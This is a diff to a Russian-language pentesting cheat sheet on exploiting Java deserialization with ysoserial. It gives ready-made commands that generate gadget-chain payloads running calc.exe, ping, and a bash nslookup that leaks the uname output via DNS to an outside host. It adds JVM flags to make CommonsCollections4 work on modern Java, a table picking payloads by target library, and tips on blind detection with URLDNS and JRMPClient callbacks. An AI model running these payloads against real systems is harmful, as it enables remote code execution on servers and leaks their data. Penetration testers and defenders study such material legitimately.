@@ -32,9 +32,32 @@ java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
 java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
 java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
 java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[удалено]' | gzip | base64
-```
 
-* Список полезных данных, включённых в ysoserial
+java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED \
+     -jar ysoserial.jar CommonsCollections4 "command"
+```
+| Ситуация | Рекомендуемые payload | Примечания |
+|----------|---------------------|------------|
+| Неизвестная среда | URLDNS, CommonsBeanutils1 | Начать с теста |
+| Commons Collections 3.x | CommonsCollections1, 5, 6, 7 | Самые стабильные |
+| Commons Collections 4.x | CommonsCollections2, 4 | Для версии 4.0 |
+| Spring приложение | Spring1, Spring2 | Требует Spring в classpath |
+| Java 7 | Jdk7u21 | Специфичный для Java 7 |
+| Ограниченная среда | Clojure, Groovy1 | Если есть соответствующие библиотеки |
+| Modern Java | CommonsCollections4 с --add-opens | Java 11+ |
+
+* URLDNS - запускает поиск DNS для предоставленного URL. Самое главное, она не полагается на целевое приложение, использующее определенную уязвимую библиотеку, и работает в любой известной версии Java. Это делает ее наиболее универсальной цепочкой гаджетов для целей обнаружения.
+> Если обнаружить сериализованный объект в трафике, можно попробовать использовать эту цепочку для создания объекта, который запускает взаимодействие DNS с сервером Burp Collaborator. 
+
+* JRMPClient — можно использовать для первоначального обнаружения. Она
+> заставляет сервер попытаться установить TCP-соединение с предоставленным IP-адресом.(нужно указать необработанный IP-адрес, а не имя хоста.) 
+>> может быть полезна в средах, где весь исходящий трафик защищен брандмауэром, включая поиск DNS.
+>>> сгенерировать полезные данные с двумя разными IP-адресами: локальным и внешним, защищенным брандмауэром.
+>>> Если приложение немедленно отвечает на полезные данные с локальным адресом, но зависает на полезных данных с внешним адресом, это означает, что цепочка сработала, потому что сервер пытался подключиться к защищенному брандмауэром адресу.(помогает определить, происходит ли десериализация в слепых случаях.)
+
+**Список полезных данных, включённых в ysoserial**
 
 | Нагрузка | Автор | Зависимости |
 |----------|-------|-------------|
